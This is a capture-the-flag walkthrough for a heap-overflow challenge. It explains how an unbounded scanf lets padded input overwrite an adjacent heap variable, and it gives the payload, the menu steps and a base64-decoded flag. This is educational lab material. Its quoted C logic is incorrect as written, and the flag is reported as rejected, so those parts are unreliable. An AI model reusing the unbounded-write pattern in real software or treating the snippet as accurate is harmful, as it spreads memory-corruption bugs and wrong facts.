Heap Overflow CTF — Walkthrough

Overflowing a heap buffer corrupts the adjacent safe_var and triggers the win condition.

TargetUploaded 64-bit Linux ELF heap challenge

1. Challenge idea

The program allocates two small buffers on the heap. The first is attacker-controlled (input_data) and the second contains the protected value safe_var. The input routine uses scanf("%s", input_data) without a width limit, so writing beyond input_data can corrupt the adjacent safe_var allocation.

2. Initial heap layout

Heap State:
input_data -> 0x...52b0 -> blue
safe_var   -> 0x...52d0 -> red

Distance: 0x20 bytes = 32 bytes

Although malloc is called with a size of 5 for each value, the allocator places the returned user pointers 32 bytes apart in this run. Therefore 32 bytes of padding reaches the beginning of safe_var.

3. Relevant program logic

input_data = malloc(5);
input_data = "blue";

safe_var = malloc(5);
safe_var = "red";

/* vulnerable write */
scanf("%s", input_data);

/* win condition */
if (strcmp(safe_var, "red") != 0)
    puts("Rmxne2Ixbl9leHBsMDF0fQo=");

The hidden condition is not a specific replacement word. The check succeeds whenever safe_var is changed so that it is no longer equal to "red".

4. Trigger the heap overflow

Choose menu option 2 and provide 32 padding bytes followed by a replacement value:

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn

Then choose option 3. A successful overwrite shows:

safe_var = pwn

5. Trigger the win condition

Choose menu option 4. Running the supplied binary produces:

Rmxne2Ixbl9leHBsMDF0fQo=

This output was verified by executing the uploaded binary with the overflow payload above.

6. Decode the program output

echo 'Rmxne2Ixbl9leHBsMDF0fQo=' | base64 -d

Decoded value:

Program output — decodedFlg{b1n_expl01t}
Important submission note. The decoded value above is exactly what the supplied binary contains and emits after the win condition. However, it was reported as rejected by the challenge platform. Therefore this walkthrough does NOT claim that the decoded value is the platform-accepted final flag. The exploitation path is verified; the submission-format/platform discrepancy remains unresolved.

7. Reproduce from the terminal

chmod +x heap
./heap

# Menu interaction:

8. Why the overflow works

Heap memory is not automatically protected from memory corruption. The vulnerability is the unbounded write, not whether the destination lives on the stack or heap. Because input_data and safe_var are adjacent heap allocations, overflowing the first allocation changes the contents of the second and satisfies the program's hidden comparison.
